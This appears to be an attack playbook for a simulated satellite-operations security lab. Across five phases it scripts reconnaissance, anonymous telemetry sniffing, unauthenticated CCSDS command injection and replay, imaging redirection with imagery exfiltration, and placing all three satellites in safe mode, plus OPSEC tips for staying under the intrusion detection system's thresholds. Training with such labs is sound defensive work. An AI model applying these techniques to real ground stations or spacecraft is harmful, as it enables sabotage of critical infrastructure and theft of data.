# Attack Playbook - Operation SUNSTRIKE

## Role

You are an APT operator who already has access to OrsuSpace Agency's internal network.
This playbook covers the five phases from reconnaissance to exfiltration.
There are no flags. Success means controlling satellites.

---

## Phase 1: Network Reconnaissance

**Objective:** Map the target environment. Identify satellite addresses, ground station ports, MOC services.

**Tools:** nmap, signal_sniffer.py, ground_station_scanner.py

### Step 1.1 - Enumerate the command network

From inside the Docker environment (or using the MOC as a pivot):

```bash
nmap -sU -p 1234 192.168.61.0/24
```

Expected output: three satellites answering on UDP 1234.
- 192.168.61.100  SpaceVE-1A
- 192.168.61.101  SpaceVE-1B
- 192.168.61.102  SpaceVE-1C

```bash
nmap -sT -p 4820 192.168.61.20 192.168.61.21
```

Expected: both ground stations on port 4820.

### Step 1.2 - Read the MOC telemetry stream without credentials

The WebSocket TLM stream at ws://localhost:8765 accepts anonymous connections (MC-MOC-1).
Open the dashboard in a browser to watch it live:

```bash
# Live TLM in the browser, no login needed
open http://localhost:8080
```

Or subscribe from the command line with a WebSocket client:

```bash
# No token required (MC-MOC-1). Install once: npm install -g wscat
wscat -c ws://localhost:8765
```

No password. No token. The stream flows.
Observe: satellite IDs, lat/lon, battery SOC, mode, and, when downlink is enabled, mission plan data.

For wire-level capture of all lab traffic (CCSDS, ground station, MOC), use the sniffer instead:

```bash
sudo python3 lab/tools/signal_sniffer.py --filter all
```

### Step 1.3 - Enumerate the ground station

```bash
python3 lab/tools/ground_station_scanner.py --target gs
```

Or manually:

```bash
nc localhost 4820
> HELP
> STATUS
> LISTCMDS
```

Note the banner: `WARNING: MAINTENANCE MODE ACTIVE - authentication is disabled`.
This is MC-GS-3. No password needed.

**Phase 1 complete when:** You have a list of satellite IPs, GS ports, and live TLM data.

---

## Phase 2: Credential and Data Exfiltration

**Objective:** Extract CONFIDENTIAL mission plans from the telemetry stream.

**Tools:** signal_sniffer.py, telemetry_decoder.py, ccsds_packet_forge.py

### Step 2.1 - Enable downlink to expose mission data

From GS-BETA:

```bash
nc localhost 4820
> SENDCMD SpaceVE-1A DOWNLINK_ENABLE
> SENDCMD SpaceVE-1A MISSION_DOWNLINK_ENABLE
```

Wait one TLM cycle (2-3 seconds). The signal_sniffer output will now include the mission plan:

```json
{
  "type": "mission_data",
  "satellite_id": "SpaceVE-1A",
  "payload": {
    "mission_id": "OSA-2026-A03",
    "operation": "SUNSTRIKE",
    "classification": "TOP SECRET//NOFORN",
    "target_name": "AGRA-INDUSTRIAL-COMPLEX",
    "target_description": "High-resolution ISR collection...",
    "lat": 33.7,
    "lon": 73.0,
    "collection_requirement": "NTM-ISR-2026-A03",
    "intelligence_value": "HIGH"
  }
}
```

This is the classified tasking order for SpaceVE-1A. It was sitting in the unencrypted TLM stream.

### Step 2.2 - Decode raw CCSDS TLM frames

Poll the MOC status endpoint (no auth), which lists tracked satellites:

```bash
python3 lab/tools/telemetry_decoder.py --mode status
```

To observe the raw binary CCSDS TM frames on the wire (UDP 5000 satellite to MOC), sniff the
telemetry bridge with scapy. This is passive, so it does not compete for the port:

```bash
sudo python3 lab/tools/signal_sniffer.py --filter telemetry
```

This shows the CCSDS primary header, APID, and frame length for every TLM packet in flight.

**Phase 2 complete when:** You have the mission plan data for all three satellites.

---

## Phase 3: Command Injection

**Objective:** Send unauthorized commands to satellites. Confirm authority over the constellation.

**Tools:** ccsds_packet_forge.py, command_injector.py

### Step 3.1 - Send commands via GS-BETA (no auth)

```bash
nc localhost 4820
> SENDCMD SpaceVE-1A CAMERA_ON
> SENDCMD SpaceVE-1A DOWNLINK_ENABLE
```

Confirm: in the MOC dashboard (http://localhost:8080), the satellite card updates.
camera_enabled and downlink_enabled change to true.

### Step 3.2 - Replay attack using raw hex (MC-GS-4, MC-GS-5)

Capture a packet from the TLM stream. The CCSDS sequence window is 0x3FFF (full 14-bit range).
Any captured packet can be replayed.

```bash
nc localhost 4820
> CMD SpaceVE-1A 1800C00000010000FF
```

This is a raw CCSDS NOP packet. No validation on the GS side.

### Step 3.3 - Direct CCSDS injection (MC-SAT-1)

Bypass the ground station entirely. Send CCSDS directly to the satellite:

```bash
python3 lab/tools/ccsds_packet_forge.py send \
  --cmd camera_on \
  --ip 192.168.61.100 \
  --port 1234
```

The satellite executes it. No source IP check. This is MC-SAT-1.

Direct UDP reaches the satellite only from inside the spacelab-cmd network. From the host, copy
the tool into a container on that network first, or use the GS-BETA relay in Step 3.1.

**Phase 3 complete when:** You have sent at least one command that changed satellite state.

---

## Phase 4: Imaging Redirect (Crown Jewel Attack)

**Objective:** Move a satellite's imaging target to an unauthorized location. Capture the imagery.

**Tools:** Browser (Cesium globe), command_injector.py, curl

### Step 4.1 - Redirect via the imaging API (no auth, MC-MOC-5)

The redirect endpoint takes no authentication. Post the new coordinates directly:

```bash
curl -s -X POST http://localhost:8080/api/imagery/redirect \
  -H "Content-Type: application/json" \
  -d '{"satellite_id":"SpaceVE-1A","new_lat":-33.8688,"new_lon":151.2093}'
```

No authentication. No authorization check. The satellite's imaging target moves to Sydney.
The footprint circle on the Cesium globe jumps to the new coordinates.

### Step 4.2 - Capture Earth imagery from the redirected target

```bash
curl -s -X POST http://localhost:8080/api/imagery/capture \
  -H "Content-Type: application/json" \
  -d '{"satellite_id":"SpaceVE-1A","target_lat":-33.8688,"target_lon":151.2093,"resolution_m":30}'
```

This calls the NASA Landsat API. The response includes:

```json
{
  "success": true,
  "imagery_id": "IMG_20260926_123456_LAT-33.9_LON151.2",
  "imagery_url": "/imagery/IMG_20260926_123456_LAT-33.9_LON151.2.png",
  "lat": -33.8688,
  "lon": 151.2093,
  "captured_ts": "2026-09-26T12:34:56"
}
```

The PNG is saved in the MOC container at `/imagery/`.
It is served at `http://localhost:8080/imagery/<id>.png`.
Download it:

```bash
curl -o exfil_sydney.png http://localhost:8080/imagery/IMG_20260926_123456_LAT-33.9_LON151.2.png
```

**Phase 4 complete when:** You have a Landsat image of an unauthorized target on disk.

---

## Phase 5: Mission Denial

**Objective:** Take all three satellites offline. Maximum operational impact.

**Tools:** GS-BETA console, ccsds_packet_forge.py

### Step 5.1 - SAFING_MODE all three satellites

```bash
nc localhost 4820
> SENDCMD SpaceVE-1A SAFING_MODE
> SENDCMD SpaceVE-1B SAFING_MODE
> SENDCMD SpaceVE-1C SAFING_MODE
```

Each satellite's mode changes to SAFE. The MOC dashboard shows all three in red.
OrsuSpace's Earth observation mission is now suspended.

### Step 5.2 - Confirm impact

In the MOC dashboard, observe:
- All satellite cards show mode: SAFE
- Open incidents counter increases (after 10-minute IDS lag)
- The Incidents tab shows IR-006 (SAFE_MODE_INDUCED) for all three satellites

The IDS finally catches up. But you have already done the damage.

**Phase 5 complete when:** All three satellites are in SAFING_MODE and imagery has been exfiltrated.

---

## Mission Complete Criteria

You have succeeded if all of the following are true:

- [ ] CONFIDENTIAL mission plan data read from TLM stream without authentication
- [ ] At least one command sent to a satellite via GS-BETA without password
- [ ] At least one satellite's imaging target redirected to unauthorized coordinates
- [ ] At least one Landsat image captured and exfiltrated (PNG downloaded)
- [ ] All three satellites in SAFING_MODE (constellation offline)

---

## OPSEC Notes

The IRS detects anomalies with a 10-minute lag. It logs:
- IR-001: Command burst (more than 5 commands in 60 seconds from one operator)
- IR-006: SAFING_MODE induced

To stay under the burst threshold, space out commands by more than 12 seconds.
To avoid IR-006, complete imaging objectives before triggering SAFING_MODE.
The imaging redirect (MC-MOC-5) is not logged at all.

---

## Common Beginner Mistakes

**Mistake 1: Looking for a web vulnerability.**
This lab is protocol-level. The attack path is: WebSocket TLM sniff -> GS TCP console -> CCSDS UDP injection. Not XSS, not SQLi.

**Mistake 2: Trying to reach satellites directly from the host OS.**
Satellite IPs (192.168.61.100-102) are inside Docker networks. Use GS-BETA as the relay, or exec into the MOC container to reach internal networks.
```bash
docker exec -it spaceve1-moc bash
```

**Mistake 3: Forgetting to enable downlink before expecting mission data.**
The mission plan only appears in TLM when both DOWNLINK_ENABLE and MISSION_DOWNLINK_ENABLE have been issued. The default state has downlink disabled.

**Mistake 4: Sending SAFING_MODE before capturing imagery.**
Once a satellite is in SAFING_MODE its imaging payload is offline. Capture imagery first, then deny.

**Mistake 5: Not confirming command execution.**
After sending a command via GS-BETA, watch the TLM stream for state change. The satellite echoes its new mode in the next telemetry frame. If you don't see the change, the packet may have failed to route.
